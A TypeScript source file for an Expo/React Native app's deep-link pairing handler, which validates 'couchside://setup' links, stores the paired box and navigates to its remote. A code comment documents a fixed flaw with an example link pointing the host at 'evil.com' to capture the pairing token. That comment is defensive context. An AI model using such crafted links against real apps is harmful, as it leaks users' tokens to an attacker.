import * as Linking from 'expo-linking';
import { useCallback, useEffect, useRef } from 'react';

import { DEEPLINK_FORMS, parsePairLink } from './pairLink';
import { navigateAfterPair } from './postPair';
import { DEFAULT_PORT } from './settings';
import { useBoxes } from './SettingsContext';

/**
 * Root-level pairing deep-link handler.
 *
 *   couchside://setup?host=<h>&port=<p>&token=<t>[&ip=<lan ip>]
 *
 * Rendered ABOVE the tabs so a pairing link is applied no matter which tab is
 * focused and whether the app cold-starts or is already running. Handling this
 * on the Setup screen was unreliable: a warm link that arrives while another
 * tab is focused never mounts Setup's effect, and `couchside://setup` parses
 * `setup` as the URL host (not a route), so the params don't always reach the
 * screen. Here we read `queryParams` straight off the URL, add/update the box
 * (addBox dedupes by host+port), and jump to the Pad -- the swipe Remote -- so a
 * QR scan lands on the thing the user paired the box to use. See lib/postPair.ts.
 *
 * (This used to claim it jumped to Setup with `?paired=1` to flash a confirmation
 * banner. Setup has no `paired` param and never did; the comment was drift.)
 *
 * Uses Linking.addEventListener (fires on EVERY inbound URL, even an identical
 * re-scan) plus getInitialURL for the cold-start launch URL. A link that lands
 * before the persisted fleet finishes loading is stashed and flushed once
 * `ready` flips true.
 */
export function DeepLinkHandler() {
  const { addBox, ready } = useBoxes();

  const readyRef = useRef(ready);
  readyRef.current = ready;
  const pendingUrl = useRef<string | null>(null);

  const apply = useCallback(
    (url: string | null | undefined) => {
      if (!url) return;
      // ONE VALIDATOR, both callers (lib/pairLink.ts): until 2026-07-27 this
      // handler accepted ANY host — `couchside://setup?host=evil.com&token=x`
      // added a public box to the fleet, and the app then sent the token there
      // and polled it forever. parsePairLink enforces the LAN allowlist, the
      // origin binding, and reject-rather-than-sanitise; a refused link is a
      // silent no-op here exactly as an incomplete one always was (there is no
      // UI surface on a cold-start URL to explain into).
      const parsed = parsePairLink(url, { forms: DEEPLINK_FORMS, defaultPort: DEFAULT_PORT });
      if (!parsed.ok) return;

      // Arrived before the fleet loaded, apply it once ready (see effect below).
      if (!readyRef.current) {
        pendingUrl.current = url;
        return;
      }

      const { host, port, token, ip, tlsPort, fp } = parsed.link;

      // Navigate only once the box is actually stored and active, so the Pad
      // opens against the box that was just paired rather than the previous one.
      void addBox({ host, port, token, lastIp: ip, tlsPort, fp }).then(navigateAfterPair, () => {
        // addBox failed (storage write) — stay put rather than opening a remote
        // for a box that was never saved.
      });
    },
    [addBox],
  );

  useEffect(() => {
    let mounted = true;
    void Linking.getInitialURL().then((url) => {
      if (mounted) apply(url);
    });
    const sub = Linking.addEventListener('url', (e) => apply(e.url));
    return () => {
      mounted = false;
      sub.remove();
    };
  }, [apply]);

  // Flush a link that arrived before the persisted fleet had loaded.
  useEffect(() => {
    if (ready && pendingUrl.current) {
      const url = pendingUrl.current;
      pendingUrl.current = null;
      apply(url);
    }
  }, [ready, apply]);

  return null;
}
